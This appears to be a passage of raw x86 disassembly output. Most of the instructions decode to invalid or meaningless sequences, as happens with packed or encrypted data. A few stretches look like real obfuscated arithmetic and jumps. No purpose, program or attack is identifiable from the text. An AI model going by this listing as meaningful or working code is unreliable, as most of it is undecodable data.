  4051d2:	xchg   ebx,eax
  4051d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d4:	mov    bh,0x5
  4051d6:	mov    eax,0x360d076d
  4051db:	sub    cl,BYTE PTR [ecx+ebp*2+0x20a52231]
  4051e2:	popf   
  4051e3:	pop    edx
  4051e4:	(bad)  
  4051e5:	pusha  
  4051e6:	shl    al,0xcc
  4051e9:	xlat   BYTE PTR ds:[ebx]
  4051ea:	ins    BYTE PTR es:[edi],dx
  4051eb:	out    0x1a,al
  4051ed:	neg    BYTE PTR [edx+0x7e]
  4051f0:	add    eax,0x3cec6cd3
  4051f5:	sbb    al,0x1d
  4051f7:	shl    ah,cl
  4051f9:	(bad)  
  4051fb:	sbb    ecx,DWORD PTR [esi]
  4051fd:	dec    ebx
  4051fe:	rdtsc  
  405200:	(bad)  
  405201:	mov    bl,0x57
  405203:	sbb    ecx,eax
  405205:	xor    al,ah
  405207:	sbb    al,0x65
  405209:	cwde   
  40520a:	aam    0x9c
  40520c:	mov    ebx,0x1132f3a2
  405211:	sub    esp,DWORD PTR [ebx]
  405213:	mov    edx,eax
  405215:	xor    BYTE PTR [esp+0x1a672020],bh
  40521c:	dec    eax
  40521d:	stos   DWORD PTR es:[edi],eax
  40521e:	sbb    eax,0x2cf1804d
  405223:	inc    ebp
  405224:	mov    ecx,ebx
  405226:	(bad)  
  405227:	adc    eax,0x6e739096
  40522c:	ret    0x3099
  40522f:	ficomp WORD PTR [eax+0x35bffddb]
  405235:	jbe    0x405278
  405237:	jmp    0x40523f
  405239:	or     dl,BYTE PTR [esi]
  40523b:	xchg   edi,eax
  40523c:	aam    0x4a
  40523e:	and    BYTE PTR [ebx],al
  405240:	mov    eax,ds:0xbd863224
  405245:	pop    ds
  405246:	punpckhbw mm0,mm0
  405249:	xlat   BYTE PTR ds:[ebx]
  40524a:	arpl   WORD PTR [edi],sp
  40524c:	pop    ds
  40524d:	mov    al,0x40
  40524f:	in     eax,dx
  405250:	lea    edi,[ecx]
  405252:	xchg   edx,eax
  405253:	mov    es,WORD PTR [esi-0x4b]
  405256:	lock cmp ebp,DWORD PTR [ecx+0x5a87cc07]
  40525d:	cmp    DWORD PTR [edi],ebx
  40525f:	sub    al,BYTE PTR [eax]
  405261:	cdq    
  405262:	lods   al,BYTE PTR ds:[esi]
  405263:	dec    esp
  405264:	cmovne edi,ecx
  405267:	jle    0x4052c9
  405269:	cmpps  xmm7,XMMWORD PTR [esi+0x33],0x28
  40526e:	sbb    ebp,DWORD PTR [eax+ebx*4]
  405271:	fstp   TBYTE PTR [edx+esi*8]
  405274:	ja     0x4052b9
  405276:	push   cs
  405277:	into   
  405278:	xor    al,0x35
  40527a:	pop    edi
  40527b:	mov    dl,0x82
  40527d:	call   0xd93574f3
  405282:	cwde   
  405283:	and    BYTE PTR [eax-0x45724464],bl
  405289:	enter  0x215,0x78
  40528d:	(bad)  
  40528e:	rol    BYTE PTR [ebx+0x61],cl
  405291:	push   ecx
  405292:	cmc    
  405293:	and    eax,0xee9bf1f6
  405298:	cmp    al,0xf3
  40529a:	mov    al,0x7c
  40529c:	cmp    ah,BYTE PTR [ebp-0x5f5e66d4]
  4052a2:	mov    DWORD PTR [edi],ebp
  4052a4:	jo     0x405276
  4052a6:	mov    ss,WORD PTR [esi+0x71d5c3c6]
  4052ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ad:	cmp    esi,DWORD PTR [esi]
  4052af:	jp     0x40528a
  4052b1:	mov    DWORD PTR [eax+0x1e9bd429],0x76b15925
  4052bb:	mov    al,ds:0x2b132408
  4052c0:	jns    0x4052a5
  4052c2:	int3   
  4052c3:	shl    BYTE PTR [edx],1
  4052c5:	(bad)  
  4052c7:	jle    0x405312
  4052c9:	mov    esp,0x6728d7b8
  4052ce:	outs   dx,DWORD PTR ds:[esi]
  4052cf:	push   esp
  4052d0:	xchg   ecx,eax
  4052d1:	xchg   edi,eax
  4052d2:	cmp    al,BYTE PTR [edx+edx*4]
  4052d5:	dec    edx
  4052d6:	(bad)  
  4052d7:	push   edi
  4052d8:	jmp    0xd47e:0x87c3f2cd
  4052df:	out    dx,al
  4052e0:	scas   eax,DWORD PTR es:[edi]
  4052e1:	call   0x3306633a
  4052e6:	lods   al,BYTE PTR ds:[esi]
  4052e7:	xchg   edi,eax
  4052e8:	mov    ?,WORD PTR [edx+0x8]
  4052eb:	jb     0x405299
  4052ed:	or     bl,BYTE PTR [edi]
  4052ef:	push   esi
  4052f0:	mov    al,0x33
  4052f2:	and    al,BYTE PTR [ebx+0x7d1e46e6]
  4052f8:	sti    
  4052f9:	jns    0x40531c
  4052fb:	inc    edx
  4052fc:	sub    eax,0xa2579475
  405301:	rcl    ah,cl
  405303:	js     0x4052f5
  405305:	imul   eax,DWORD PTR [edx-0x1a7a1bd9],0xffffffe2
  40530c:	stc    
  40530d:	nop
  40530e:	mov    dh,0x98
  405310:	leave  
  405311:	test   BYTE PTR [eax-0x9],bl
  405314:	out    dx,al
  405315:	mov    edi,DWORD PTR [edx-0x6e]
  405318:	mov    al,0x60
  40531a:	(bad)  
  40531b:	je     0x4052e6
  40531d:	adc    ebp,DWORD PTR ds:0x88eaf3e0
  405323:	jle    0x405312
  405325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405326:	and    cl,BYTE PTR [esi-0x73a92c5a]
  40532c:	inc    esi
  40532d:	test   eax,0x8606b2db
  405332:	test   BYTE PTR [ebx],dh
  405334:	mov    eax,ds:0xe663587d
  405339:	mov    dh,0x4c
  40533b:	ret    
  40533c:	xchg   ecx,esi
  40533e:	in     eax,dx
  40533f:	dec    ebx
  405340:	mov    ds:0xa677c99,eax
  405345:	dec    esi
  405346:	je     0x4053ae
  405348:	and    DWORD PTR [ecx],0x72
  40534b:	lea    ebp,[eax+0x7d8f9618]
  405351:	xchg   esi,eax
  405352:	enter  0x2dff,0x81
  405356:	mov    cl,0xeb
  405358:	sub    edi,eax
  40535a:	out    dx,al
  40535b:	xchg   edi,eax
  40535c:	dec    edi
  40535d:	loopne 0x40530c
  40535f:	in     al,0xa6
  405361:	popa   
  405362:	imul   DWORD PTR ds:0x12d1cad7
  405368:	sbb    BYTE PTR ds:0xbcf758da,dh
  40536e:	std    
  40536f:	push   0x7e2d7d02
  405374:	mov    esp,0xed2056bc
  405379:	pop    ss
  40537a:	pushf  
  40537b:	push   esp
  40537c:	jl     0x405330
  40537e:	cmp    ebx,edx
  405380:	add    al,0x3e
  405382:	dec    esp
  405383:	mov    WORD PTR [esi+0x74dbcefd],fs
  405389:	ins    BYTE PTR es:[edi],dx
  40538a:	mov    BYTE PTR [ebx+edx*2-0x27],al
  40538e:	jmp    0x27cb:0x466d6179
  405395:	repnz clc 
  405397:	arpl   WORD PTR [esi],sp
  405399:	and    DWORD PTR [edx+0x41ef6f05],ebp
  40539f:	sbb    edx,DWORD PTR [ecx]
  4053a1:	and    edi,DWORD PTR [eax+ebp*4-0x32c89e2b]
  4053a8:	sub    bl,BYTE PTR [ebp-0x4fa9cff3]
  4053ae:	mov    al,ds:0x73f9f9
  4053b3:	dec    ebx
  4053b4:	aas    
  4053b5:	sbb    ebp,ebx
  4053b7:	sbb    bh,0x8f
  4053ba:	call   0x977eeca7
  4053bf:	dec    eax
  4053c0:	leave  
  4053c1:	into   
  4053c2:	and    BYTE PTR [esp],ch
  4053c5:	sbb    DWORD PTR [esi+0x5faa55a2],0xffffffc8
  4053cc:	jb     0x4053f7
  4053ce:	sub    ch,BYTE PTR [ebp-0x67]
  4053d1:	test   al,0x61
  4053d3:	mov    ch,0x5e
  4053d5:	lods   al,BYTE PTR ds:[esi]
  4053d6:	add    eax,0x299f31e6
  4053db:	sub    al,0x6b
  4053dd:	jno    0x40538b
  4053df:	inc    esi
  4053e0:	stos   BYTE PTR es:[edi],al
  4053e1:	push   ds
  4053e2:	imul   bh
  4053e4:	xor    BYTE PTR [ecx+0x577db6b2],dh
  4053ea:	leave  
  4053eb:	inc    esp
  4053ec:	push   esi
  4053ed:	(bad)  
  4053ee:	std    
  4053ef:	jp     0x405406
  4053f1:	adc    BYTE PTR [eax+ebx*2],0x6b
  4053f5:	push   edi
  4053f6:	call   0xbfe5:0x6c69e99a
  4053fd:	ja     0x405468
  4053ff:	mov    ecx,0xd4ac4f86
  405404:	fadd   QWORD PTR ds:0xc9dd8a1b
  40540a:	fisub  DWORD PTR [eax+0x7f]
  40540d:	cmp    BYTE PTR [edx],ah
  40540f:	xchg   ebp,eax
  405410:	cmp    DWORD PTR [eax+ebp*1-0x4ce7d2f9],esi
  405417:	sbb    BYTE PTR [ebx+0x3651ec34],0x56
  40541e:	mov    ecx,esi
  405420:	cld    
  405421:	pop    ebp
  405422:	(bad)  
  405423:	mov    BYTE PTR [edx-0x22eea3b5],bl
  405429:	mov    eax,ds:0x2f3c25ed
  40542e:	loope  0x405453
  405430:	outs   dx,DWORD PTR ds:[esi]
  405431:	loope  0x405449
  405433:	pusha  
  405434:	nop
  405435:	enter  0x5f9d,0x31
  405439:	pop    ds
  40543a:	push   edx
  40543b:	scas   eax,DWORD PTR es:[edi]
  40543c:	mov    ebx,ss
  40543e:	scas   al,BYTE PTR es:[edi]
  40543f:	(bad)  
  405441:	jb     0x405459
  405443:	or     al,0x5e
  405445:	jmp    0x47e29610
  40544a:	mov    DWORD PTR [ebx+eax*1],esp
  40544d:	retf   0xd3ef
  405450:	push   ebp
  405451:	test   eax,0xa8b85558
  405456:	pop    edx
  405457:	scas   al,BYTE PTR es:[edi]
  405458:	inc    esp
  405459:	lahf   
  40545a:	(bad)  
  40545b:	call   0x46d5:0xaf3444cb
  405462:	dec    ebx
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x55cbfbb8]
  405484:	inc    edx
  405485:	rcl    eax,1
  405487:	sub    edi,DWORD PTR [esi+0x7e]
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40549b
  40548f:	push   edi
  405490:	sbb    eax,0x246d8687
  405495:	jae    0x4054db
  405497:	sub    ebx,ebp
  405499:	mov    ah,0xdc
  40549b:	pop    edi
  40549c:	xlat   BYTE PTR ds:[ebx]
  40549d:	cmc    
  40549e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40549f:	test   edi,ebx
  4054a1:	nop
  4054a2:	std    
  4054a3:	jb     0x4054bf
  4054a5:	add    ecx,DWORD PTR [edx]
  4054a7:	mov    ecx,0x5cbf6185
  4054ac:	and    ebx,DWORD PTR [eax-0x39]
  4054af:	jmp    0x47f0ea83
  4054b4:	mov    fs,WORD PTR [ebx+0x941e1ec]
  4054ba:	and    ah,BYTE PTR [edx+0x4a]
  4054bd:	or     BYTE PTR [eax+0x3fe683d3],dh
  4054c3:	mov    BYTE PTR [eax],al
  4054c5:	retf   
  4054c6:	pushf  
  4054c7:	outs   dx,BYTE PTR ds:[esi]
  4054c8:	daa    
  4054c9:	dec    eax
  4054ca:	mov    bh,0xd5
  4054cc:	rol    BYTE PTR [edx+esi*8-0x5be64e94],0x29
  4054d4:	mov    WORD PTR [ecx-0x2384727],cs
  4054da:	enter  0xb9b,0x71
  4054de:	lods   eax,DWORD PTR ds:[esi]
  4054df:	jle    0x405492
  4054e1:	frstor [edi-0x7da0dc0f]
  4054e7:	iret   
  4054e8:	sub    DWORD PTR [esi+0x7a69d1bd],ecx
  4054ee:	shl    DWORD PTR [edi-0x75],0x64
  4054f2:	push   ecx
  4054f3:	out    dx,eax
  4054f4:	pushf  
  4054f5:	daa    
  4054f6:	repnz fs inc eax
  4054f9:	(bad)  
  4054fa:	outs   dx,BYTE PTR ds:[esi]
  4054fb:	dec    eax
  4054fc:	xlat   BYTE PTR ds:[ebx]
  4054fd:	dec    esp
  4054fe:	fwait
  4054ff:	sbb    eax,0xd5572510
  405504:	outs   dx,BYTE PTR ds:[esi]
  405505:	mov    cl,0x8a
  405507:	mov    eax,ds:0x5bf1dc89
  40550c:	dec    ebp
  40550d:	inc    esp
  40550e:	repz test eax,0xcc6879bb
  405514:	jne    0x4054c8
  405516:	outs   dx,BYTE PTR ds:[esi]
  405517:	es jae 0x405509
  40551a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40551c:	sub    eax,0x233457bc
  405521:	jbe    0x405530
  405523:	lods   eax,DWORD PTR ds:[esi]
  405524:	cwde   
  405525:	pop    ds
  405526:	inc    ebx
  405527:	in     al,dx
  405528:	in     al,dx
  405529:	fnop   
  40552b:	mov    ebx,0x3806b9f5
  405530:	jg     0x4054d9
  405532:	(bad)  
  405533:	add    eax,0x2e67a1ed
  405538:	sbb    ah,BYTE PTR [ebp+0x3636664f]
  40553e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40553f:	dec    ebp
  405540:	sub    BYTE PTR [edi+eax*4-0x54],cl
  405544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405545:	push   cs
  405546:	adc    DWORD PTR [esi],ebx
  405548:	rol    DWORD PTR [ecx-0x7d],1
  40554b:	pop    ecx
  40554c:	inc    edx
  40554d:	mov    al,ds:0xa9f3a380
  405552:	mov    ch,0x43
  405554:	pop    ecx
  405555:	fnsave [esi-0x35]
  405558:	xor    eax,0x7dec4c8b
  40555d:	add    DWORD PTR [ecx],esp
  40555f:	mov    eax,0xcf0e6a1a
  405564:	mov    WORD PTR [ebx+0x4b],ss
  405567:	std    
  405568:	ror    BYTE PTR [edi-0x66],0x8a
  40556c:	stos   DWORD PTR es:[edi],eax
  40556d:	sub    BYTE PTR [ebp+0x4c0ebc62],0xb
  405574:	sbb    eax,0x96399d36
  405579:	in     eax,0xa1
  40557b:	imul   edi,DWORD PTR [ecx+esi*1-0xe740d95],0xde6037dd
  405586:	cmp    esi,eax
  405588:	pop    ss
  405589:	and    bh,dh
  40558b:	stos   BYTE PTR es:[edi],al
  40558c:	stc    
  40558d:	adc    edx,DWORD PTR [ebx+0x50]
  405590:	fld    QWORD PTR [esi-0x50016d34]
  405596:	mov    eax,ds:0x27dda20e
  40559b:	inc    ebx
  40559c:	and    eax,0xf193a91e
  4055a1:	(bad)  
  4055a2:	hlt    
  4055a3:	imul   esi,ebx,0x82996a75
  4055a9:	and    al,0x33
  4055ab:	push   ebx
  4055ac:	pop    edx
  4055ad:	and    eax,0x6315f2c0
  4055b2:	nop
  4055b3:	ja     0x405550
  4055b5:	sbb    DWORD PTR [eax+0x578a9b75],ebp
  4055bb:	and    esi,DWORD PTR [esi]
  4055bd:	std    
  4055be:	arpl   bp,si
  4055c0:	add    esp,DWORD PTR [ecx-0x10]
  4055c3:	cmc    
  4055c4:	ret    
  4055c5:	xor    edi,ebx
  4055c7:	cmp    DWORD PTR [edx+0x3e],esp
  4055ca:	stc    
  4055cb:	add    DWORD PTR [ecx+0x21],eax
  4055ce:	ss push esi
  4055d0:	xchg   ebx,eax
  4055d1:	retf   
  4055d2:	bnd jmp 0x59331036
  4055d8:	pop    ecx
  4055d9:	inc    esi
  4055da:	into   
  4055db:	aad    0xe4
  4055dd:	les    ebx,FWORD PTR [eax-0x78]
  4055e0:	jle    0x405614
  4055e2:	jbe    0x405584
  4055e4:	rcl    BYTE PTR [edx-0x13],cl
  4055e7:	sbb    ch,ch
  4055e9:	push   es
  4055ea:	pop    ecx
  4055eb:	(bad)  [ebx+0x194c3f1a]
  4055f1:	in     eax,0xdd
  4055f3:	sbb    ebx,0x7f
  4055f6:	push   esi
  4055f7:	xor    DWORD PTR [edx+0x3],0x36
  4055fb:	sbb    DWORD PTR [edi-0xd],edi
  4055fe:	add    bh,ah
  405600:	call   0xf371:0x5b4c8592
  405607:	lds    ebx,FWORD PTR [edi-0x43]
  40560a:	jl     0x40561b
  40560c:	test   al,0x67
  40560e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40560f:	jmp    0x4055c4
  405611:	mov    ebx,0x91afb7
  405616:	cmc    
  405617:	into   
  405618:	addr16 dec esi
  40561a:	das    
  40561b:	mov    ecx,0x417c09a0
  405620:	cli    
  405621:	(bad)  
  405622:	fadd   QWORD PTR [esi]
  405624:	lahf   
  405625:	lea    ecx,[ecx+eax*8]
  405628:	imul   eax,DWORD PTR [ebp-0x47],0x63
  40562c:	sub    DWORD PTR [eax-0x48f94037],edx
  405632:	dec    esi
  405633:	cmp    BYTE PTR [edx],cl
  405635:	lock mov edx,0xa1c77600
  40563b:	rcl    DWORD PTR [eax],0x9a
  40563e:	call   0x1d092ace
  405643:	nop
  405644:	xchg   esi,edi
  405646:	push   ebp
  405647:	js     0x4055fd
  405649:	out    dx,al
  40564a:	cmp    ah,BYTE PTR [edi+0x47]
  40564d:	pusha  
  40564e:	mov    edi,ebp
  405650:	(bad)  
  405652:	repz loop 0x405696
  405655:	lods   eax,DWORD PTR ds:[esi]
  405656:	aad    0x7d
  405658:	(bad)  
  405659:	rol    BYTE PTR [ebx],cl
  40565b:	aad    0x1
  40565d:	jge    0x405616
  40565f:	inc    esi
  405660:	stos   BYTE PTR es:[edi],al
  405661:	push   ebp
  405662:	outs   dx,DWORD PTR ds:[esi]
  405663:	pop    edx
  405664:	(bad)  
  405665:	jo     0x4056bc
  405667:	jle    0x4056d7
  405669:	jae    0x4056e6
  40566b:	fcom   DWORD PTR [ebx+0x218c95e1]
  405671:	dec    ecx
  405672:	adc    esi,DWORD PTR [ebx+ebx*1+0x5c30ccf3]
  405679:	bound  esi,QWORD PTR [eax-0x65]
  40567c:	push   esi
  40567d:	popa   
  40567e:	inc    edx
  40567f:	cmp    ah,al
  405681:	mov    DWORD PTR [ebx+0x7454427b],ebp
  405687:	mov    ecx,0xcfc239e5
  40568c:	mov    eax,0x1fd97f1e
  405691:	push   ebx
  405692:	inc    eax
  405693:	jb     0x405685
  405695:	sbb    eax,0xd5ea4e41
  40569a:	scas   eax,DWORD PTR es:[edi]
  40569b:	pop    eax
  40569c:	js     0x405703
  40569e:	lods   eax,DWORD PTR ds:[esi]
  40569f:	imul   ecx,DWORD PTR ds:0xb785efcc,0xffffffdb
  4056a6:	(bad)  
  4056a7:	ss mov ah,0x96
  4056aa:	sbb    eax,0x63b890c
  4056af:	inc    eax
  4056b0:	inc    edi
  4056b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b2:	adc    al,0x4b
  4056b4:	call   DWORD PTR ds:0x781caa45
  4056ba:	or     al,0xf3
  4056bc:	shl    BYTE PTR [esi-0x69faa16c],cl
  4056c2:	adc    DWORD PTR [edx+0x70],esp
  4056c5:	push   edi
  4056c6:	jmp    0x9a065854
  4056cb:	jge    0x405684
  4056cd:	hlt    
  4056ce:	ins    BYTE PTR es:[edi],dx
  4056cf:	js     0x4056f8
  4056d1:	xor    bl,BYTE PTR [esi]
  4056d3:	push   ebp
  4056d4:	and    DWORD PTR [edi+0x2fb4b525],0x73
  4056db:	push   ecx
  4056dc:	or     DWORD PTR [edi],0xbd035cbf
  4056e2:	ins    DWORD PTR es:[edi],dx
  4056e3:	pop    ecx
  4056e4:	add    eax,0x40ea9683
  4056e9:	pop    es
  4056ea:	and    DWORD PTR [edx-0x6a],eax
  4056ed:	lods   al,BYTE PTR ds:[esi]
  4056ee:	das    
  4056ef:	outs   dx,DWORD PTR ds:[esi]
  4056f0:	fwait
  4056f1:	cmp    edx,DWORD PTR [eax+0x2df45b4d]
  4056f7:	add    eax,0xb349d2e4
  4056fc:	scas   al,BYTE PTR es:[edi]
  4056fd:	pcmpeqb mm7,QWORD PTR [esp+esi*8]
  405701:	and    edx,DWORD PTR [ebp+0x1e]
  405704:	into   
  405705:	inc    ecx
  405706:	push   0xffffffff
  405708:	add    edx,edx
  40570a:	popf   
  40570b:	push   esp
  40570c:	mov    bh,0x3f
  40570e:	sar    DWORD PTR [ebx+0x408a2f55],cl
  405714:	and    eax,0x49a1f160
  405719:	in     eax,0x2a
  40571b:	in     al,0x9b
  40571d:	test   ebx,esi
  40571f:	adc    al,0xdf
  405721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405722:	dec    edi
  405723:	arpl   WORD PTR [eax+eiz*8],dx
  405726:	leave  
  405727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405728:	inc    DWORD PTR [edx]
  40572a:	mov    edx,0x75a17907
  40572f:	xchg   ebx,eax
  405730:	ss mov edi,0x2fc3e68e
  405736:	stos   DWORD PTR es:[edi],eax
  405737:	push   ebp
  405738:	add    BYTE PTR [ecx],ch
  40573a:	hlt    
  40573b:	sub    ch,BYTE PTR [eax]
  40573d:	dec    ebp
  40573e:	or     dh,BYTE PTR [edx-0x37f21399]
  405744:	stc    
  405745:	pop    eax
  405746:	adc    DWORD PTR [ebp-0xd],ecx
  405749:	push   esp
  40574a:	(bad)  
  40574c:	in     al,dx
  40574d:	das    
  40574e:	xchg   BYTE PTR [ebx+0x396fa85a],al
  405754:	(bad)  
  405755:	lahf   
  405756:	xchg   BYTE PTR ds:0x7e12b529,dl
  40575c:	fwait
  40575d:	push   ebx
  40575e:	(bad)  
  40575f:	mov    ebp,0x24f12dcf
  405764:	cmp    al,0x6f
  405766:	test   BYTE PTR [ebp+eiz*8+0x1e],bl
  40576a:	adc    DWORD PTR [ebp-0x19],0xffffffa7
  40576e:	popa   
  40576f:	sbb    ebx,edi
  405771:	shr    DWORD PTR [esi-0x5],1
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x3e
  4057f5:	jge    0x40583b
  4057f7:	or     BYTE PTR [edx],bh
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	out    0x8f,eax
  405802:	dec    ebp
  405803:	fimul  WORD PTR ds:0x79c03d37
  405809:	dec    edx
  40580a:	push   ds
  40580b:	mov    ds:0xc13244ef,eax
  405810:	mov    ss,WORD PTR [esp+ebx*2+0xd271c4b]
  405817:	cmc    
  405818:	and    dl,BYTE PTR [eax+0x35]
  40581b:	daa    
  40581c:	jmp    0xb02:0xa3046332
  405823:	test   eax,0x9604cb7e
  405828:	push   esi
  405829:	adc    dl,al
  40582b:	loope  0x405812
  40582d:	sub    ah,BYTE PTR [ebp-0x75]
  405830:	test   esi,edx
  405832:	(bad)  ds:0x909a9470
  405838:	jp     0x40586e
  40583a:	inc    ebx
  40583b:	dec    ebp
  40583c:	jo     0x40580e
  40583e:	mov    WORD PTR [ebp+edi*1+0x470dca88],?
  405845:	fs stc 
  405847:	bound  esp,QWORD PTR [edi]
  405849:	pusha  
  40584a:	retf   
  40584b:	test   al,0x84
  40584d:	ins    BYTE PTR es:[edi],dx
  40584e:	pop    edx
  40584f:	ror    cl,0x59
  405852:	sbb    esp,DWORD PTR [esp+ebp*2-0x1154e615]
  405859:	(bad)  
  40585b:	hlt    
  40585c:	push   cs
  40585d:	add    eax,0x3a1c6ecc
  405862:	lock mov ecx,0x69c88648
  405868:	jg     0x4058b9
  40586a:	jmp    0x2c1c:0x6790fa86
  405871:	rol    ecx,cl
  405873:	fcom   DWORD PTR [ecx+0x51]
  405876:	sub    al,0x35
  405878:	in     eax,0x4a
  40587a:	in     eax,0x64
  40587c:	jge    0x405872
  40587e:	pop    eax
  40587f:	shl    BYTE PTR [esi-0x80],1
  405882:	outs   dx,DWORD PTR ds:[esi]
  405883:	stos   DWORD PTR es:[edi],eax
  405884:	jmp    0x21229f44
  405889:	jae    0x405889
  40588b:	sti    
  40588c:	in     al,0x1f
  40588e:	(bad)  
  40588f:	out    dx,eax
  405890:	xchg   ebx,eax
  405891:	xchg   esi,eax
  405892:	dec    ebx
  405893:	loop   0x4058be
  405895:	or     eax,0xdb0c3f7e
  40589a:	test   BYTE PTR [esi+0x3e],bh
  40589d:	in     al,dx
  40589e:	jmp    0x80d5e711
  4058a3:	push   eax
  4058a4:	cdq    
  4058a5:	sbb    al,0xbe
  4058a7:	fwait
  4058a8:	mov    ds:0x565e6b2,eax
  4058ad:	sub    eax,0x9db84b1b
  4058b2:	sbb    BYTE PTR [esi],cl
  4058b4:	or     BYTE PTR [edx],dl
  4058b6:	dec    esp
  4058b7:	mov    ch,0x9a
  4058b9:	popa   
  4058ba:	mov    ebp,0xe8277705
  4058bf:	adc    esi,edx
  4058c1:	or     BYTE PTR [eax-0x153ac1e0],dl
  4058c7:	push   ebp
  4058c8:	cmp    bh,0x2
  4058cb:	ins    DWORD PTR es:[edi],dx
  4058cc:	jmp    0x4058a2
  4058ce:	jp     0x4058c3
  4058d0:	push   edi
  4058d1:	(bad)  
  4058d2:	repz leave 
  4058d4:	jae    0x4058b0
  4058d6:	mov    ecx,DWORD PTR [ecx-0x4]
  4058d9:	and    esi,esp
  4058db:	jge    0x405951
  4058dd:	shl    BYTE PTR [ecx-0x4947060c],cl
  4058e3:	mov    ch,0xfa
  4058e5:	jp     0x40594e
  4058e7:	test   BYTE PTR [ecx+0x64],dl
  4058ea:	xchg   esi,eax
  4058eb:	sbb    edx,esp
  4058ed:	mov    edx,0xdd4b1fee
  4058f2:	inc    esp
  4058f3:	loopne 0x4058ee
  4058f5:	mov    WORD PTR ds:0x62d6f8e0,?
  4058fb:	pop    eax
  4058fc:	cmp    DWORD PTR [esi+0x636603c4],edx
  405902:	mov    eax,ds:0xf04e3391
  405907:	ins    BYTE PTR es:[edi],dx
  405908:	mov    WORD PTR [ebp-0x1aa4cf39],ss
  40590e:	clc    
  40590f:	jns    0x40598d
  405911:	xchg   esp,eax
  405912:	ret    0x24b0
  405915:	or     al,0x27
  405917:	addr16 mov edi,0xcb4685ef
  40591d:	mov    al,0x82
  40591f:	ret    
  405920:	test   eax,0x2658cdb
  405925:	pop    esi
  405926:	cwde   
  405927:	pop    edx
  405928:	xchg   ebp,eax
  405929:	cmp    ch,bl
  40592b:	aaa    
  40592c:	retf   
  40592d:	and    eax,0xe4e620fc
  405932:	dec    esi
  405933:	xor    BYTE PTR [edi],al
  405935:	xor    dl,BYTE PTR [ebp+0x695acf17]
  40593b:	mov    esi,0x49976aca
  405940:	or     DWORD PTR [esi],0x0
  405943:	(bad)  
  405944:	ds repz std 
  405947:	jl     0x4059a9
  405949:	test   BYTE PTR [edi],bl
  40594b:	xor    DWORD PTR [eax+0x31ff6dfd],eax
  405951:	jb     0x4058f9
  405953:	xchg   edi,eax
  405954:	mov    dh,al
  405956:	int    0x6f
  405958:	scas   eax,DWORD PTR es:[edi]
  405959:	bound  ebx,QWORD PTR ds:0xbdd475e7
  40595f:	mov    bh,0xa8
  405961:	inc    ebx
  405962:	sahf   
  405963:	add    DWORD PTR [eax],edx
  405965:	loope  0x40597f
  405967:	or     edx,eax
  405969:	mov    dh,0xc5
  40596b:	sbb    BYTE PTR [ecx-0x73cf3288],cl
  405971:	mov    esi,0x6fd13c9f
  405976:	mov    ds:0x1e9e3193,eax
  40597b:	lds    ecx,FWORD PTR es:[ecx-0xe]
  40597f:	in     al,0x8b
  405981:	retf   
  405982:	or     BYTE PTR [ebp+0x41],dl
  405985:	jmp    0x9dcef89e
  40598a:	add    al,0xf9
  40598c:	sbb    al,cl
  40598e:	xchg   esp,eax
  40598f:	in     al,0x8
  405991:	and    esi,DWORD PTR [edx-0x6e]
  405994:	call   0x16ff9454
  405999:	pop    edi
  40599a:	inc    edx
  40599b:	sar    dl,1
  40599d:	shr    bl,cl
  40599f:	aam    0x63
  4059a1:	fwait
  4059a2:	add    ebx,DWORD PTR [edi]
  4059a4:	out    dx,eax
  4059a5:	lea    esi,[ebp-0x547a1cee]
  4059ab:	mov    al,ds:0x235fe067
  4059b0:	rol    DWORD PTR [edi+eiz*1-0x27],1
  4059b4:	pushf  
  4059b5:	int    0xf1
  4059b7:	xlat   BYTE PTR ds:[ebx]
  4059b8:	in     al,dx
  4059b9:	push   cs
  4059ba:	pop    ss
  4059bb:	dec    ebp
